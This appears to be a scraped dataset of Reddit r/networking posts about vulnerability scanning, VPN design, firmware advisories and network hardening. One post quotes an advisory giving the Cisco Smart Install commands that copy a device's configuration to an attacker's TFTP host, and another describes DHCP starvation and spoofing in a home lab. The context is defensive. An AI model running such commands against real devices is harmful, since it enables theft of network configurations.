0,vulnerability,networking,Authenticated Vulnerability Scans in FIPS mode for Juniper Gear?,1,i53v5o,https://www.reddit.com/r/networking/comments/i53v5o/authenticated_vulnerability_scans_in_fips_mode/,2020-08-07 10:34:43,"My company uses Juniper gear in an environment that requires FIPS to be enabled. When performing authenticated scans (currently using Tenable.sc) the scanner can successfully authenticate using the service account credentials we provide, but all of the subsequent checks fail because the scanner is unable to identify the operating system of the device. Doing a little digging through logs, we discovered that the scanner is not using the correct command - the command used to show operating system information is usually show version, but when FIPS is enabled, the command is show version local. Apparently the nessus plug-ins dont know this. Weve also done a PoC of Rapid7 Nexspose with the same results. I refuse to believe we are the only people using Juniper gear with FIPS enabled that are also doing authenticated vulnerability scans... has anyone else successfully scanned FIPS-enabled gear? If so, what scanner was used? Thanks!"

I'm on day 2 of working w/ TAC Support on it and they seem stumped. We have an HA pair of ASA 5516s that handle our site-to-site and AnyConnect VPNs into our network. Recently I decided to upgrade to FW version [9.13.1.12](URL from 9.13.(1) to patch the AnyConnect vulnerability that was seen out in the wild. And by doing this I *uncovered* an issue on our Primary pair member.. I say uncovered because I am newer here and cannot think of any time in which we have failed over, so I can't confidently say if this issue has always existed or is new w/ this firmware... The issue is this: users can AnyConnect in succesfully. I tested w/ 9 users. 8 of them got in no problem, got IPs, traversed the network. #9 connects to AnyConnect, gets an IP, and suddenly can't do anything on the network. No traversing, DNS is broken, can't ping anything... Troubleshooted the hell out of this w/ TAC and it's just that SOME IPs designated from that pool for some reason are not getting advertised in the Routers RIP. For example: PC7 might get [172.16.0.4](URL PC8 gets [172.16.0.5](URL PC9 gets [172.16.0.6](URL ASA advertises RIP Route for 172.16.04, [172.16.0.5](URL but NOTHING for [172.16.0.6](URL If we destroy the whole Group + Pool and just start w/ a Pool w/ 1 address, [172.16.0.6](URL issue still occurs... Scheduled to get on with yet another tech. One wanted to try a different FW version, but others from the VPN team said they want to keep looking first because there are no known bugs w/ this FW. Ever see anything like this?"

When it comes to scanning our corporate environment, we've been having a lot of issues out of the scan. Our corp office consist of 2 6807xl VSS core and 2960x 15.2(7)E0a stacks for the access layer and the Nessus scanner is only scanning the management interfaces of the network equipment. There are no firewalls that it is scanning through. I dove into all the logging and NetFlow information I can, and it appears that as soon as the Nessus scanner starts the SYN part of the scan, the switches start throwing Spanning tree PVID inconsistency errors or SSTP BPDU with bad TLV errors. The VSS attempts to mitigate whatever causes this by blocking and unblocking VLANs on the aggregate links (lacp active) to no avail, and within 4 minutes of the scanner starting, I get switches that begin crashing and throwing traceback and IPC errors and will make and render the switch unmanageable/unaccessible and stop forwarding traffic. Also from what I can gauge, the SYN scanner seems to be doing an ""all at once"" scan and it looks very aggressive, INFOsec manages the Tenable/nessus scanners themselves. This a reproducible issue with the scanners and I'm waiting to hear what TAC has to say about it.

DNS and DHCP services are likely to be located on a different subnet. That way, the malicious payload would be discarded on switch and the DG is likely to have a system, where it would not be possible to exploit the vulnerability for which the malware was tailored, as the target system is likely to be Windows.

15,vulnerability,networking,Can the ISP collect a master access key from every connected server?,1,duuab0,https://www.reddit.com/r/networking/comments/duuab0/can_the_isp_collect_a_master_access_key_from/,2019-11-12 02:56:35,"I'd like to start by clarifying that I'm speaking of something I head about briefly from a friend, hence why I'm asking to understand more about it. Please forgive my ignorance if I'm missing anything obvious here, and yes I'm aware this may turn out to be BS and not based on reality. Some background on what brought this up: Earlier this week I went to the Million Mask March movement for Anonymous in my city... not much of a movement since it was only 3 of us, but eh. I chatted with the organizer again who is the friend of a friend (my ISP). He has a bit of knowledge on tech, but is a man from the system who knows a few people high up with stories and knowledge on various topics (including secret services, spying and hacking). He told me something both worrying and intriguing: That in many countries, ISP's are required by law to collect the private keys of every server hosting content... which allegedly happens through an automated process at networking level. If this key is not collected, the internet connection won't even work until the ISP has it. The key in cause can allegedly bypass any password or encrypted transmission: When I asked he said that yes, it gives the government full access to any server if they want it, even if it's running over a secure HTTPs connection. This doesn't make much sense to me, but I figured I'd ask so I can learn about such a mechanism if it exists. I never heard of it before and have no idea how this could even work: The encryption is done between the server and clients... as long as there's no control over the software and it deliberately sends this data to a third party, I don't see how the ISP can obtain a private key from every connected server. I can only imagine some obscure vulnerability at networking level, but even so I can't think of what this key is and represents. Was there any truth to this story? Is there a master key delivered to the ISP when you start any server software, which can grant the ISP and government full access to your server? Do you know of any laws mandating ISP's to collect any server access keys in any form, and if so could you let us know what this key actually is?"

I'm more interested in how you handle it and if you've discovered any helpful hints or tools that can make the process easier, both immediately, or over time. The few specific complaints I do have is that Nessus only reports via IP, so we get a lot of duplicate reports--one for most interfaces on each device. Additionally, we've been told that blacklisting only works for 90 days, and we've had to review many items repeatedly as they re-appear in our scan results.

Our network security team (who primarily come from government sector backgrounds) feel the need to be scanning all of our core transport equipment. This has not necessarily been a big deal, other than they wreak havoc on our alarm log with the hundreds of failed login attempts. Last week, though, we came in to find about 14 of our 65 nodes refusing telnet and SSH connections. After 12 hours of troubleshooting with Adtran we finally discovered that all of the 384 TCP listening slots were locked up. We rebooted the System controller to clear all the connections and all was good. Over the next few days and several troubleshooting instances with Adtran we discovered the list of IPs that were holding the TCP connections. They were all from our Network Security Teams probes. It came to light that their scans had discovered a bug in Adtran's firmware that in a very specific set of port scanning would allow port 77 to get locked in the Syn-received state and would not time out the connection. Each scan would grab any where from 3-7 connections on this port, so after a few months all available connections are used. All of this to be said what do other engineers at ISPs do as far as handling Vulnerability scanning. I've talked to someone I know at another ISP, and they thought it was ridiculous to be Scanning the core equipment. Their mindset was all of the transport equipment should be behind a firewall and have no public access so there is not reason to be scanning it. My team feels the same way, but the Security guys don't agree, and will not stop scanning even though they are killing us on this management issue. If anyone has some white papers, or any kind of information one way or another that would be extremely helpful."

In this way the encrypted VPN traffic traverses directly between external router and VPN Concentrator, bypassing the firewall completely, and the decrypted traffic from the distant end of the tunnels is just dumped on the trust zone directly to the core. Like I said, Ive seen many such designs just like this: both in practice, as well as in the texts. The logic is that VPNs protect Confidentiality, Integrity, and Authenticates peers. For this reason the traffic is going from a Trusted zone to a Trusted zone, so no firewall inspection is necessary. All thats necessary is restricting traffic to that outside port on the VPN Concentrator to only the appropriate ports and protocols of whatever IPSEC Suite youre using. One fear of mine, is this potentially exposes your datacenter to malicious traffic, if a branch got infected, so wouldnt you rather terminate the inside port of the VPN Concentrator to a DMZ zone that has to traverse the firewall. One design consideration here, is how do you prevent spoke to spoke hairpinning from happening on the Concentrator, but rather force spoke-to-spoke traffic out that interface and to the firewall for inspection. Even if that traffic may hairpin on the firewall, but that would be acceptable. Another step further would be outside and inside alike going to a DMZ, so both the encrypted tunnel traffic, and decrypted traffic is made to traverse the firewall. This would ultimately be the safest bet, so the VPN Concentrator is not exposed directly to the Internet, which makes it a potential critical vulnerability to accessing the network. After all, if compromised, it has an interface directly on the internal trust segment, granting unfettered access. Clearly this discussion pertains to the single tenant enterprise environment, whereas cloud hosts have their own proprietary way of conducting business. What are your thoughts? How would you deploy this, how have you seen it deployed, and what would auditors say about each methodology?"

We have a 6800 switch as the front end and then it's splits if to ASA, VPN router and some other devices. We have two WAN subnets used as VRFs and we have 1 LOCAL WAN subnet that goes between the VPN RTE and ASA. On the switch, we have default route pointing to the ASA (all traffic) Returning traffic hits the VRF1 unless its down, then it hits VRF2. All VPN, all services (NAT), are using the LOCAL WAN subnet. My question is, why would they do it that way? Why even have those 2 PRIVATE WAN subnets? Why not just utilize that LOCAL WAN? By the way, theyre all from the same ISP, same account. Any ideas? Besides, isnt this a security vulnerability? We have our corporate VLANs on it. The way the routing is setup, you cannot gain access to inside without passing the ASA first anyway but that does sound like red flag either way."

This confused me a bit because for example, if I NAT port 443 of a specific web server to be exposed to the public internet (Destination NAT), then NAT has essentially created a specific small hole through my firewall. The fact of doing this also ""blocks"" all other ports from being exposed by default (to said web server). On our specific firewalls, I can configure this NAT rule to only NAT based on a specific source IP or region. If source doesn't match, traffic won't get forwarded to the web server. What more can a Security Policy add to this? I know nextgen firewalls can perform vulnerability and malware scanning on these security rules but I'm asking from just a networking vulnerability standpoint. Thanks all!"

Summary: ~ is caused by a series of hardware design flaws within Ciscos Trust Anchor module. First commercially introduced in 2013, Cisco Trust Anchor module (TAm) is a proprietary hardware security module used in a wide range of Cisco products, including enterprise routers, switches and firewalls. TAm is the root of trust that underpins all other Cisco security and trustworthy computing mechanisms in these devices.  allows an attacker to make persistent modification to the Trust Anchor module via FPGA bitstream modification, thereby defeating the secure boot process and invalidating Ciscos chain of trust at its root.

Using VirtualBox I have one client Windows 10 computer, another running OpenDHCP and Kali Linux all sharing a virtual network. First I tried DHCP starvation with Yersinia and DHCPig originating from Kali targeting the OpenDHCP server. Thousands of DHCP Discover messages are generated and temporarily occupy resources of the DHCP server, but neither tool completes the DHCP transaction with DHCP Offer messages to confirm interest in the lease and finalize the handshake. The result is that when the flood of DHCP Discover messages ends the DHCP server resumes normal operation almost immediately instead of holding onto full leases for the duration of a full default lease to exhaust the scope. I can watch the traffic in WireShark and confirm that Discover messages are followed by Offers from the server, but again, no Requests and Acknowledge messages. The other vulnerability through DHCP traffic spoofing I'd like to explore is DHCP Spoofing where Kali releases the lease that the client Windows 10 computer made with the OpenDHCP server. Yersinia and DHCPig are supposed to be able to exploit this also, but if I monitor WireShark traffic, no DHCP Release message is generated by Kali. Are there other tools that I should be using? Ive researched tutorials for these exploits and what Im trying to accomplish is pretty basic as far as requirements from the tools. In other words default settings should be able adequate.

57,vulnerability,networking,"Help - Manager is stuck in the 1990s, want to implement Collapsed Network as Spine-leaf witgh East/West Traffic and ACLs on the switches",81,98qguf,https://www.reddit.com/r/networking/comments/98qguf/help_manager_is_stuck_in_the_1990s_want_to/,2018-08-20 14:06:09,"We have a SaaS application collocated at a couple datacentres in different areas of the world for prod and DR. Currently we have a spaghetti-mess of different switches (2960s, 4509s, 3750s, etc.) some are stacked, some are stand-alone, all doing spanning tree as they are looped. Hanging off of this we have a couple hands full of physical servers, a couple UCSs, a couple Blad Systems, a 3-4 SANs, and a couple sets of LBs, all of our ILO/iDRAC, and serial KVMs, etc. Most physical compute resources are running VMWare or Windows, and Most Virtual compute is hosting Windows guests. The network is used only for the SaaS application itself and management of the SaaS application, although the QA and some semi-production instances are housed in the same network segments. Currently, all of this networks have a core switch which they plug into, which has non-redundant connections for several sets of ASA firewalls, one for management traffic and VPNs, another for client VPNs, and the other used entirely by the application traffic These firewalls connect to all networks using a single interface and have a max throughput of 1gbit/s and 50k connections or so. None of the plans are currently packet switches or layer 3 routed within the existing switches. Instead, all of the traffic moves through them, up to the firewalls, which do the routing and ACLs between hosts on the networks. There is the concern due to long failover times causing interruption of the application when some of the existing switches have gone down. We have also repeatedly run into issues where connections to the admin firewalls have been used up while running vulnerability scans ---- We have purchased new Nexus 9000 switches to act as a single pair of root devices inside of the firewalls. We are in agreement to try to remove as much of the old 1g switching infrastructure as possible (although blade systems will need to stay, and we may need to keep at least 1 pair of old switches to plug ILO/idrac/LBs into. My proposed design is to migrate to a collapsed network that is a true spine - leaf setup. My goal in this is to completely eliminate spanning tree and reduce the need to have any connection dropping due to a device or port failing. Additionally, I would like to move all East/West traffic within these networks in the data center down to the new Nexus 9k switches This includes implementing ACLs between hosts in as similar a fashion as possible to the existing ASA Firewalls. I believe this should allow us to reduce chances to drop application traffic due to firewall failover or device/port outage to practical nil. ---- I have gone over this with my manager, and after spending hours meeting with him he was finally in agreement, however the next day he sent me an email saying he wasn't convinced and asking to see more on how things would work and pushing again just to implement the switches as dumb switches in the core running spanning tree, doing no layer 3 or packet switching. He then set up a meeting with his manager where he undermined my work ethic and said the project was going nowhere. His manager suggested writinng the whole thing up and going over it, again as a group, which I am fine with on the face of it.. However I have found out he is working to collect as much oppinion to contradict my reasoning as possible saying that ACLs on the switches are too cumbersome to manage and will be too confusing, and add more places to look to troubleshoot which is too much ewffoer, and only he and I and maybe one other person will be able to look in on the ACLs regardless, so he doesn't want them to be too hard. In speaking with him over the phone, he attacked thw whole thing as unmanagement nd needing to take too long to implement, and said that others he knows are saying that managing the switches with ACLs is too much trouble. (subjective) He's also afraid that we'll ""have to check two places for any issue (Firewalland switch) when to me it just means east/west = check switch north/souht check firewalls. Hower I admit he might be right I mean I imagined we could use a couple deny internal network range"" and then ""allow any IP"" after that to allow for the wirewalls, what might be a better mnethod there? He also complainged that the firewalls will basically be doing ""only nat"" but they will still handle the ACLs for in/out boudn traffic, including VPNs,s o to me thats a fair bit. He did suggest maybe making the change only for the management network, and after some time I am leaning towards accepting that chanage, although that will in my mind cause the exact issue even more so of havingf to check tweo places to see where the traffic goes wrong. ---- Is there a solid rebuttle of this? Am I over thinking things? Is is really worth doinng what I'm doinng? I came here hoping to get somme thoughts on how to rebut these Items but I also admit, maybe it is worth re-thinking the ACL migration to the switch, what do you think? How can I manage my boss over-all on this if I'm goingn innt he right path? Is there any caveat I or my manager didnt think of that should be considered? thanks to all for your help and support on this! :) "

59,vulnerability,networking,Just had my first zero-touch zero-downtime automated ASA HA pair upgrade!,122,9awdvk,https://www.reddit.com/r/networking/comments/9awdvk/just_had_my_first_zerotouch_zerodowntime/,2018-08-28 15:52:59,"I am of course aware that Kirk Byers has a tutorial for a zero-touch ASA upgrade, however we run exclusively HA pairs and I wanted a production ready way to upgrade my remote pairs with zero touch and zero downtime. Additionally, my scripts use NetBox as a backend data source and notify me via Microsoft Teams when taking action. I've been playing with my lab 5515-X pair for the last several days and today scheduled my Corporate pair (the hub for my 30+ sites) and a remote site simply because they run AnyConnect and needed to be upgraded for a vulnerability. Where before I would have scheduled one site per night I'll now be able to schedule all remaining sites in one night and just watch them work. Moving forward this allows me to be more consistent and timely with upgrading. Future improvments will have a web interface from which you can schedule uploads/upgrades and view the current status of jobs, but that's once I get a better understanding of Flask and can figure out non-blocking asynchronous celery sticks, or something. At this time they're simple Python scripts that run in Docker containers, one for uploads and one for the upgrade process alone. A simple shell script allows me to run the containers with a single simple command and some parameters (pair hostname+version). In this case I just scheduled a cron job to run each job. Of course my upload container is separated from the upgrade and intended to be run ahead of time. The upload script does a lot of hoopla but ultimately just uploads via SCP. The upgrade process takes the following steps: * Send a message to Teams telling me the process is starting * Verify the appropriate file exists on both ASAs for the desired software platform to upgrade to * Set boot variables * Reload the standby * Wait for it to come up to Standby Ready status * Failover * Reload the new standby * Wait for it to come up * Fail back over (if the 'primary' is the current standby, otherwise stay where it is) * Double check the current running software version on both boxes is the new one * Enable the ASA REST API module * Configure the ASA REST API module * Update NetBox so the pair is documented as having been upgraded * Finally, send me a Teams message of completion. My try/excepts ensure if there's any issues I get a failure Teams message instead of the completion one, and as a last resort my containers all have the hostname appended to their name so I can review the logs if something goes horribly, horribly wrong.

The purpose being to identify opportunities for improved security, connectivity, scalability, efficiency and maintenance. -Question Numero Uno, and the specific goal of this post, is whether I should continue as the confused/uneducated party responsible to maintain the local network, leaning on tele-support options like Geek Squad when I need guidance or clarification to continue? Or am I anywhere near justification for outsourcing and the associated costs? Lastly, can yall make suggestions outside the two options currently on the table?? Maybe a hybrid solution or tech/hardware/software driven solution that simplifies local network administration for dum-dums like this one??? Just a little tidbit on our business and technologys role within it: -We are a Small Business clocking sub$5MM in annual revenue. We employ 23 people and assign work to thousands of subcontractors nationally every month. - The office with the local network, is what Im most concerned about this minute. There are 20 work-stations for our 24, soon to be 25 employees. Around 5 people generally work remotely, using their own personal computer to access the web ab and with private cell phones. -Keep in mind that no info data, etc -Most key work flow processes are carried out by our team, predominately using our proprietary PreCloudEra-cloud based application. Our CEO guided its development back in 08 working with a seemingly well-talented programmer. He since made a change and we parted ways. We were referred to a development firm in India and we now pay a monthly amount to have them staff one top quality full-time, dedicated developer who handles ALL updates and new coding related to our application. He also created and maintains the hosting environment(AWS redundant servers, etc...) Im very excited about task automation too. Can anybody give me a little feedback on their favorite platforms for such an item? -Being Im addressing the local network, which is used exclusively for internet connectivity and networking printers, (lately those of us with laptops that we cant plug in to Ethernet, have been greatly affected by WiFi interruptions.) No file sharing occurs locally. We utilize many of the office 365 apps, including one-drive for cloud sharing. Please stick with me one minute more. Summary of local network: cox for business powers-&gt; zyxcel router powers&gt;24 port Cisco switch connects-&gt;live Cat 6 at each station powers&gt;20+ polycom VoIP desk phones on Intermedias platform, powers- --&gt;each of 20+ desktop PCs, all HP, running varying versions of Windows 7-10 home, and varying antivirus/security software all with different renewal dates/trial lengths/associated svc plans..... We are not storing or saving anything locally on the network except whats saved to our actual individual computers. from our owned software to the office 365 apps, nearly everything we do is cloud based. That said, Im wondering if vulnerability in the local network could ultimately offer a path to our web application that our on-site/remote employees are logging in to and working in daily. The MySQL database for our web app stores a lot of protected data, so we would want to be leaving a back door. Solution: This is where you come in. -I have already identified the value in paying for and installing Windows 10Pro on all of the companys equipment. Especially since we use the office apps and they sync up nicely. -Next, should I shop firewalls, antivirus softwares, upgrade switch (24 ports will be too small within 30-60 days), WiFi router apart from firewall? -Is there any good reason to evaluate security the same way where I have offsite folks who A) use the same phones which connects them to same cloud phx? B) log directly in to our web application with near admin level access from their personal PCs. -Is it realistic, as we near 30+ devices including printers and TVs, for me to continue handling this with as needed tele-support? If so, can yall suggest a more user friendly solution for setup and for maintenance review? Perhaps an automated solution for risk alerts and guided steps for configuration changes? All of this coupled with kickass security we can be proud of will be a huge weight off my shoulders. You see most of our clients are fortune 500 and either subject to FCRA or HIPPA, so we wanna tighten up before they audit. IMPORTANT: if we are better off to outsource to a 3rd party IT mgmt company, please give me any available advice on finding a good dependable accountable solution! Thanks Reddit!!"

It's really shocking to see that this big exploit was out there and Cisco officially announced it in March. I understand that ACLs can prevent this exploit, but like the notice mentions it is on the ISP and service equipment that can still have this exploit. URL Then it was marked as a vulnerability in 2018. URL A good read about the vulnerability last year. ""Between June 29 and July 6, 2017, Russian actors used the Cisco Smart Install protocol to scan for vulnerable network devices. Two Russian cyber actor-controlled hosts, 91.207.57.69(3) and 176.223.111.160(4), connected to IPs on several network ranges on port 4786 and sent the following two commands: copy nvram:startup-config flash:/config.text copy nvram:startup-config tftp://[actor address]/[actor filename].conf In early July 2017, the commands sent to targets changed slightly, copying the running configuration file instead of the startup configuration file. Additionally, the second command copies the file saved to flash memory instead of directly copying the configuration file. copy system:running-config flash:/config.text copy flash:/config.text tftp://[ actor address]/[actor filename].conf"" A nice write up how to mitigate. Of course there's patching. ""How to Mitigate SMI Abuse Configure network devices before installing onto a network exposed to the Internet. If SMI must be used during installation, disable SMI with the no vstack command before placing the device into operation. Prohibit remote devices attempting to cross a network boundary over TCP port 4786 via SMI. Prohibit outbound network traffic to external devices over UDP port 69 via TFTP. See Cisco recommendations for detecting and mitigating SMI. [10] Cisco IOS runs in a variety of network devices under other labels, such as Linksys and SOHO Internet Gateway routers or firewalls as part of an Internet package by ISPs (e.g., Comcast).

It is best, if you only allow known IP addresses to connect to your router to any services, not just Winbox. We suggest this to become common practice.

I've been helping build a regional fiber network, and since january I've created about 10 servers, 15 vlans, learned JuneOS, figured out the calix gear and their hella bad gui thing. I have NMS setup (monitoring not alerting yet) Servers with letsencrypt/snmp/intrusiondetection. I've done preliminary vulnerability scans and that has been ok. My issue is documentation is sprawling (hence netbox) I'm basically the only one that understands how the dns/dhcp/ntp/ftp servers work or how to update and troubleshoot them (I'm trying to teach as I go, but their isn't much time) I'm hoping netbox will let me condense everything i've been putting in visio/notepad/excel into one place. But I'm missing some type of config management preferably open source. (right now i have the devices that support it, sending a copy of the config to my office server on commit, and server backups doing the same) but sometimes I catch the other guys doing things they don't fully understand (I've found a few config files with /example/example copied directly from the configuration guide) Dont get me wrong they are learning a ton and great to work with, but there are so many moving parts its hard to keep track of it all. I have a syslog server setup and everything is dumping logs there too, so I can go back and see what people changed and fix it. I have a small pfsense instance with snort setup, but have been thinking about expanding that. This is a community/rural environment so budget is a concern (I thought they were going to choke when a networking company wanted 170$/hr to do some configuration work... LOL There was really no plan as far as I can tell from layer 2 up. Layer 1 was well planned and engineered, but they did't even have a single server setup for dhcp/dns when I started in january. There are vlans going all over the place for voip/TV/etc (i hope netbox will help there too) I've been working so much I actually just found where I setup a g2032 ring and barely remember doing it, much less documenting it in my crappy spreadsheet. We have strong passwords for everything, I showed them how to gen random ones and never use the same one twice, but that is becoming an issue too (does netbox securely store that? or do I need to just break down and get keypass or setup openlap or something?) I've been out of the ISP side for probaby 10 years so i'm rustly as hell. None of the vendors have been much help, Everyone that told them to buy juniper... when we asked for help said ""oh we don't have it yet, we can get professional services to help in 6-8 weeks"" /facedesk Over all it has been really fun but exhausting, I see the guys getting exicted when we turned up the first customer and it reminded me of building the first ISP I started when I was 20.

Basically, I have a mirror port from our Aruba 2930F core switch to the threat check server. The port being mirrored is the port that leads to the outbound firewall. The vendor is saying that they can't see any traffic because it is encapsulated. We don't have any VLANs outside of the native VLAN. We also don't have any other trunks. There is no 802.1q encapsulation showing up under ethernet II in wireshark for that mirror port. However, the vendor says they ran: tcpdump -i eth1 -c 30 -nn vlan and tcp port 80 and since it returned results that means there is encapsulation at play. I could not find anything in the man tcpdump page that describes the -nn switch (any thoughts on what this is?). Does putting the ""vlan"" filter with no specified vlan number indicate encapsulation if it finds any traffic? The monitor query on the HP switch interface is: monitor all both mirror 1 no-tag-added I am trying to get to the bottom of this particular issue. The vendor workaround suggestion is to mirror all ports minus the two going to the threat check server and the one port out to the firewall. I am a little hesitant about doing this in production. Does anyone have any feedback on this? Edit: So I didn't change any configs over the weekend. I emailed the vendor today to take another PCAP because ""I made some changes over the weekend."" She replied saying everything looks great. Commence face palming. Thanks everyone for your thoughts on this! "
84,vulnerability,networking,Comcast Business just remotely disabled the 1-to-1 NAT on my cable modem without telling me,91,5ztaru,https://www.reddit.com/r/networking/comments/5ztaru/comcast_business_just_remotely_disabled_the_1to1/,2017-03-17 08:03:50,"Anyone else using a range of static IPs on a Comcast Business Cisco cable modem notice any problems? We had an internet outage yesterday. We had to power cycle the cable modem and our internal router to restore connectivity. I presume this is when a firmware update occurred. Once the cable modem came up, our outbound traffic started working again when coming from one of our routers that used the default NAT address but not from the others that were assigned to 1-to-1 NAT for different IPs. Upon further investigation, we saw that the 1-to-1 NAT configuration was still present on the cable modem, but it was sending traffic to the internal router using the public IP, as if the router was in Bridge mode. Obviously the router with a 10-net IP address dropped the traffic destined for the cable modem's public ip, so all of our inbound traffic for VPNs also failed as did all of the reply traffic for outbound sessions. I called Comcast support and they confirmed that there is a security vulnerability in their cable modems and they had to disable 1-to-1 NAT in the latest firmware update to mitigate it and that I should buy my own device to do 1-to-1 NAT if I need that feature. Re-architecting my network isn't the issue here as I already have a firewall I can use to do NAT, but the fact that Comcast remotely modified the configuration of my gateway device without notifying me and taking down a section of my network concerns me greatly. Of course I'm in a Comcast-only area and switching ISPs is prohibitively expensive, so I'm really just curious if anyone else has seen this happen or if I'm just especially ~~cursed~~ lucky. Update: We shuffled around our internal devices and assigned the static IP addresses directly to the firewall and put the cable modem into what they call 'Pass-through mode' and everything is back up and running without using the 1-to-1 NAT. Apparently Comcast Support wasn't notified of this change either and had no idea what the proper configuration was. I called 6 times before I got someone who knew what he was doing and fixed the cable modem config. The first 5 people either didn't understand or gave me incorrect values to use on my firewall."

From Draytek UK URL Please be advised that there are new critical firmware updates available for DrayTek products. We have applied the improvements to most DrayTek routers and our wireless access points; you can check the latest version no. in the appendix to this email. These firmware updates are designated 'critical' (see below) so you should update your product and those of your clients (or let them know) as soon as possible. A 'critical' update is one which includes one or more security improvements relating to product operation or an industry standard protocol. You should update at your earliest opportunity, 'Critical' is our second level of firmware priority (1 is 'Emergency' and 3 is 'Update when convenient') so whilst this update does not relate to a known 'in-the-wild' or WAN-side vulnerability, you should still upgrade your product as soon as possible. How to Upgrade Download your new firmware from this web page (for UK/Ireland users only). Once you have the appropriate firmware file for your product, you can upgrade from the 'system maintenance' menu in the web interface - but do always take a configuration backup first (from that same menu). Remember that the firmware .ALL file will upgrade the firmware only but the .RST file will upgrade firmware and wipe out all settings back to factory defaults so always use the .ALL file unless you really want to wipe out all settings. If you use DrayTek's ACS-SI management platform, you can use that to roll out the new firmware to all products en-masse. Further Information If you have questions about how to upgrade your products, please contact our support department by clicking here (UK/Ireland only) - please do not reply to this email as we cannot provide support or further info from this email address. Although no further information is available on the security improvements currently, once there are further updates, they will appear on this page. Always keep firmware up to date We would also take this opportunity to remind you that they should have a regular program of checking and updating product firmware even when there isn't a specific announcement like this one. This ensures that you have the latest features, improvements but also security improvements to help product security in a continuously evolving threat landscape. Even if the latest firmware is not critical it may include improvements from an earlier release which was critical, so do always keep up to date.

As I'm sure everyone here knows, there were major disruptions to the internet on Friday when DNS servers experienced DDoS attacks. From what I understand, the sole duty of a DNS server is to translate a user's human language internet address request into a series of numbers - the IP address. Would it be possible for browsers to simply have an internal 'phone book' that was frequently updated, containing at least for the top 10,000 or so websites? The translation from text address to IP address would then be done before the request was even sent, completely eliminating the need for DNS servers. It wouldn't take more than a GB of memory, and it seems like it would be faster and more secure than making an external call to a DNS server, like cutting out a link of the chain, and this huge international internet vulnerability wouldn't be an issue.

Until now I've been working with sites that have routed solutions but now I'm at a site that has a bridged solution where the /30 is an RFC1918 address and I'm wondering about how this will work. I should add that at all these remote sites we're using a router on a stick topology. Internet traffic comes in on the /30, into a switch, over to the router on a physical port with subinterfaces, and then gets routed back down to the switch and either out to the internet or our LAN as needed. On one hand I'm thinking I need to apply the ACL against the /30 because that's where the traffic will be coming in, but that's an RFC1918 address and invisible to the outside world. The outside world will be having a destination IP of our /29. But if I apply the ACL against the /29 then I'm potentially blocking legitimate conversation between hosts on the /29. For example: * RFC3330 suggests blocking traffic sourced from RFC1918 addresses ... but we use RFC1918 addresses inside our LAN. Access lists come before NAT in the ACL order of operations. So if I apply this against the /29 my LAN won't be able to talk to themselves or out to the internet. * At sites that have a non-RFC1918 external address I have to permit incoming GRE and SSH. If I apply this ACL to my /29 aren't I saying that I'm permitting GRE and SSH from external IPs that are coming in on my LAN subinterface (which should never happen)? * If I restrict incoming IKE1V to being sourced from the public IPs of our other sites and then apply that to the /29 then aren't I saying that I'm restricting that traffic from coming in on my LAN subinterface (which also should never happen)? But if I apply the ACL to the /30 I don't see how that could work either because the incoming traffic will have a destination IP that doesn't match the RFC1918 IP on the port. I don't know. I must be forgetting something really basic. What am I missing?"

Basically if some terrible vulnerability exists is discovered in Junos is the fxp interface 100% isolated from the traffic routing engine so someone on the internet couldn't get to it and in turn to the segment it's connected to?

Cisco has published a [Security Advisory](URL but I haven't seen one for Juniper yet. Copied from Cisco's SA: &gt; A vulnerability in the IP Version 6 (IPv6) packet processing functions of multiple Cisco products could allow an unauthenticated, remote attacker to cause an affected device to stop processing IPv6 traffic, leading to a denial of service (DoS) condition on the device. &gt; &gt; The vulnerability is due to insufficient processing logic for crafted IPv6 packets that are sent to an affected device. An attacker could exploit this vulnerability by sending crafted IPv6 Neighbor Discovery packets to an affected device for processing. A successful exploit could allow the attacker to cause the device to stop processing IPv6 traffic, leading to a DoS condition on the device. &gt; &gt; This vulnerability is not Cisco specific: any IPv6 processing unit not capable of dropping such packets early in the processing path or in hardware is affected by this vulnerability. Note as of 22:50 PT, 1-Jun-2016: &gt; There are no workarounds that address this vulnerability. &gt; &gt; Customers should rely on external mitigation techniques, such as denying IPv6 ND packets in an access control list (ACL) placed on an Internet edge router, to protect infrastructure devices behind those routers. IPv6 ND packets should be limited to local links and dropping them on the edge can help protect the infrastructure. It is a commonly accepted best practice to drop these packets at the Internet edge. Alternatively, configuring static IPv6 neighbors where possible, and denying all IPv6 ND packets at the edge help mitigate this vulnerability. UPDATE: As of 12:49 PT, 2-Jun-2016, received this forward from a colleague (with permission to share) from their Juniper SE: &gt; The Juniper SIRT is aware of the vulnerability and is actively investigating the impact on Juniper Networks products and services. Currently, the MX Series, PTX Series, and QFX10002 have been confirmed to not be vulnerable to the IPv6 Neighbor Discovery denial of service vulnerability. Should one or more products be found to be vulnerable, we will publish an advisory in-cycle as part of our quarterly JSA bundle publication schedule.

Thank you everyone for the advice and information. Truly appreciated. I'll expand a bit on this project given the attention to this post. What I've found so far is that my client has a flat /16 network (approx. 400 machines on the network) with a broadcast domain spread out across 16 switches; all on VLAN 1, all daisy chained together half with trunks half with access ports. Cringe worthy, right? Out of 4 floors in the building, one floor is responsible for the bulk of the traffic which is mostly AV gear, video conferencing units and IP cameras; given how some of the switches are interconnected, some traffic goes to the core switch downstairs and then back up to a switch that's right beside it. Now there's a few things that need to be done (understatement of the century) some of them are listed below. Which would you tackle first? Feel free to add/remove to the list: * Implement distribution layer, start building out hierarchical topology * Monitor traffic flows, grouping machines according to conversations * Create VLAN and group like devices (regardless of traffic patterns) * Section off entire AV/IP Camera floor and route instead of switch to the core * Tell client I've decided to be a dirt farmer instead"

